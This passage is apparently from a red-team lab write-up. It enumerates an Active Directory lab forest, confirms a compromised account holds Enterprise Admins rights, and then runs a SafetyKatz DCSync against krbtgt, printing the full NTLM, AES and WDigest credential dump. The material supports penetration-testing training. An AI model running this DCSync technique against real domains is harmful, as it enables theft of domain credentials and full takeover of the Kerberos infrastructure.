+<p>The domain controller is <code>SEC-DC</code>, located at the IPv4 address <code>192.168.144.1</code>, and is running Windows Server 2019 Standard. It serves as a global catalog server and is not read-only, meaning it can process write operations and perform replication. The server is fully integrated into the forest <code>gcbsec.local</code>, and it holds all five FSMO roles, Schema Master, Domain Naming Master, PDC Emulator, RID Master, and Infrastructure Master. This indicates that <code>SEC-DC</code> is the most authoritative domain controller in this environment.</p>
+
+<p><code>Get-ADTrust -Filter *</code></p>
+
+<figure><img src="../../assets/crtm/image 224.png" alt="Get-ADTrust"></figure>
+
+<p><code>Get-ADGroup -Filter * | Select-Object -ExpandProperty 'Name'</code></p>
+
+<details>
+<summary><strong>Groups</strong></summary>
+<pre><code>Administrators
+Users
+Guests
+Print Operators
+Backup Operators
+Replicator
+Remote Desktop Users
+Network Configuration Operators
+Performance Monitor Users
+Performance Log Users
+Distributed COM Users
+IIS_IUSRS
+Cryptographic Operators
+Event Log Readers
+Certificate Service DCOM Access
+RDS Remote Access Servers
+RDS Endpoint Servers
+RDS Management Servers
+Hyper-V Administrators
+Access Control Assistance Operators
+Remote Management Users
+Storage Replica Administrators
+Domain Computers
+Domain Controllers
+Schema Admins
+Enterprise Admins
+Cert Publishers
+Domain Admins
+Domain Users
+Domain Guests
+Group Policy Creator Owners
+RAS and IAS Servers
+Server Operators
+Account Operators
+Pre-Windows 2000 Compatible Access
+Incoming Forest Trust Builders
+Windows Authorization Access Group
+Terminal Server License Servers
+Allowed RODC Password Replication Group
+Denied RODC Password Replication Group
+Read-only Domain Controllers
+Enterprise Read-only Domain Controllers
+Cloneable Domain Controllers
+Protected Users
+Key Admins
+Enterprise Key Admins
+DnsAdmins
+DnsUpdateProxy</code></pre>
+</details>
+
+<p><code>Get-ADGroupMember -Identity 'Enterprise Admins'</code></p>
+
+<figure><img src="../../assets/crtm/image 225.png" alt="Get-ADGroupMember Enterprise Admins"></figure>
+
+<p>We verified that <code>syslogagent</code> is indeed a direct member of the <code>Enterprise Admins</code> group. This was a critical discovery, as it solidifies our foothold at the forest level. We also see the domain <code>Administrator</code> account as another member of this group, further validating that this group is membership is intentionally structured for top-tier administrative access.</p>
+
+<p>Together, this triage gives us a clear view of where <code>syslogagent</code> stands within the hierarchy, while not a domain admin, it holds a higher strategic position as an enterprise admin, which can be leveraged for further attack paths or persistence mechanisms across the AD forest.</p>
+
+<p><code>.\SafetyKatz.exe "privilege::debug" "lsadump::dcsync /user:sec\krbtgt" "exit"</code></p>
+
+<figure><img src="../../assets/crtm/image 226.png" alt="DCSync Attack"></figure>
+
+<details>
+<summary><strong>DCSync</strong></summary>
+<pre><code>.\SafetyKatz.exe "privilege::debug" "lsadump::dcsync /user:sec\krbtgt" "exit"
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # lsadump::dcsync /user:sec\krbtgt
+[DC] 'gcbsec.local' will be the domain
+[DC] 'sec-dc.gcbsec.local' will be the DC server
+[DC] 'sec\krbtgt' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 5/26/2019 4:44:00 AM
+Object Security ID   : S-1-5-21-4056425676-3036975250-1243519898-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: da6010de93e6e1c94bdd90bb42a9920e
+    ntlm- 0: da6010de93e6e1c94bdd90bb42a9920e
+    lm  - 0: 6a78868ea499826ad40dcd2bc80490f5
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 9e2fdb212cf30e2f2480ba48e1fbc2a7
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : GCBSEC.LOCALkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 431ea6c9bee05ed969f0787cd57c00d1105a20b748511956aa4881732890b9d3
+      aes128_hmac       (4096) : d696b81649c3d126680548702e7d6013
+      des_cbc_md5       (4096) : c1297a2fc49d31bc
+
+* Primary:Kerberos *
+    Default Salt : GCBSEC.LOCALkrbtgt
+    Credentials
+      des_cbc_md5       : c1297a2fc49d31bc
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:WDigest *
+    01  1056e56c2297fa1365354d09fa247175
+    02  2aa3e92e74f26e57bb06a6bc0a62af21
+    03  ea3d761ead7417b5f63328ba3780c791
+    04  1056e56c2297fa1365354d09fa247175
+    05  2aa3e92e74f26e57bb06a6bc0a62af21
+    06  955d5fe74d5432721ebd1108f288eca9
+    07  1056e56c2297fa1365354d09fa247175
+    08  6fd58204c68d4ce36f04c688650e8753
+    09  6fd58204c68d4ce36f04c688650e8753
+    10  cfcf9e3c9e2fcb7ab04f652767f75724
+    11  29981ec91d9887c62b0f00b8a01dc201
+    12  6fd58204c68d4ce36f04c688650e8753
+    13  27f3c32a1f8477a301b0d7338baf93e5
+    14  29981ec91d9887c62b0f00b8a01dc201
+    15  abf96c2c7f1bf6a99876221b77f97889
+    16  abf96c2c7f1bf6a99876221b77f97889
+    17  3f6aec6c5144aaa2e75420a4999abb8d
+    18  401a4ca99f0cf769fcbd195c155b8766
+    19  29f720174be0cba1863ca6abefa6cfeb
+    20  c6f66bdaae424ca4a71afebf3fd61e4d
+    21  29138b630c456ced08cc87983885c628
+    22  29138b630c456ced08cc87983885c628
+    23  a4bcbb1e4d55217dc18b7a1973369a58
+    24  46fe5e00c979824f9dc10be122cf77c6
+    25  46fe5e00c979824f9dc10be122cf77c6
+    26  762a6abd9d68635aea5adc242461e704
+    27  23836fd24ee77536d5f5b7d59edc0d0b
+    28  9b8d5eb9490a8c8d2326b6e81be89651
+    29  202d78ad58eff2556fc005ab2703ebd1</code></pre>
+</details>
+
+<p>We successfully performed a DCSync attack using SafetyKatz from a host where we had compromised the <code>syslogagent</code> user, who is a member of the <strong>Enterprise Admins</strong> group. This privilege level was critical because it gave us the necessary rights to replicate domain secrets without needing additional ACL manipulation.</p>
+
+<p>The DCSync operation targeted the <code>krbtgt</code> account in the <code>sec</code> domain. As expected, it returned a full credential dump, including the NTLM hash, LM hash, and Kerberos key material (AES, DES, and supplemental credentials like WDigest and NTLM-Strong-NTOWF). This confirms full control over the Kerberos ticket granting infrastructure.</p>
+
+<div class="course-navigation">
+  <a class="prev-part" href="part-04-phase-4-section-7.html">
+    ← Previous: Phase 4 - Section 7
+  </a>
+  <a class="next-part" href="part-06-phase-6-section-9.html">
+    Next: Phase 6 - Section 9 →
+  </a>
+</div>
+        </section>
+      </article>
+    </div>
+  </main>
+
+  <script src="../../assets/js/script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+</body>
+</html>
